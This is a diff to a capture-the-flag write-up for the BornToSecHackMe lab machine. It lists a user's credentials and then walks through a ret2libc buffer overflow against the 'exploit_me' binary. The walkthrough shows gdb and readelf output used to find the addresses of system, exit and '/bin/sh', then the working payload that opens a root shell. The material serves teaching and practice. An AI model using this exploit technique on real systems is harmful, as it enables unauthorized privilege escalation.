@@ -194,7 +194,94 @@ MD5 -> 646da671ca01bb5d84dbb5fb2238dc8e
 user: `zaz`
 password: `646da671ca01bb5d84dbb5fb2238dc8e`
 
+```
+zaz@BornToSecHackMe:~$ ldd exploit_me
+	linux-gate.so.1 =>  (0xb7fff000)
+	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
+	/lib/ld-linux.so.2 (0x80000000)
+
+zaz@BornToSecHackMe:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+   239: 0011d550    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
+   615: 0003f060   141 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
+  1422: 0003f060   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+
+zaz@BornToSecHackMe:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
+   109: 00032ff0    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
+   136: 00032be0    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
+   549: 000b81d8    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
+   604: 00120750    68 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
+   640: 00032fc0    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
+   856: 00032e20    58 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
+  1024: 0012ac80    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
+  1359: 001a5224     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
+  1470: 000fc500    67 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
+  2055: 001a515c     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
+  2205: 00032c10    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
+  2346: 00101c10     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
 
 
+zaz@BornToSecHackMe:~$ strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin"
+ 160c58 /bin/sh
+ 162682 /bin:/usr/bin
+ 162bc5 /bin/csh
+ 163810 /etc/bindresvport.blacklist
 
+./exploit_me `python -c 'print "A"* 140 + "\x60\xf0\x03\x00" + "\x58\x0c\x16"'`
+not work
+```
 
+```
+(gdb) r `python -c 'print "A" * 140'`
+Starting program: /home/zaz/exploit_me `python -c 'print "A" * 140'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGILL, Illegal instruction.
+0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+Address system: `0xb7e6b060`
+
+```
+(gdb) p exit
+$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+
+```
+
+Address exit: 
+
+```
+(gdb) info proc mappings
+process 1844
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+	0xb7e2b000 0xb7e2c000     0x1000        0x0
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0
+	0xb7fda000 0xb7fdd000     0x3000        0x0
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0x8048000 to 0xc0000000, "/bin"
+A syntax error in expression, near `to 0xc0000000, "/bin"'.
+(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
+0xb7f8cc58
+1 pattern found.
+
+```
+Address /bin/sh: `0xb7f8cc58`
+
+```
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'`
+
+id
+cd /root
+cat README
+```
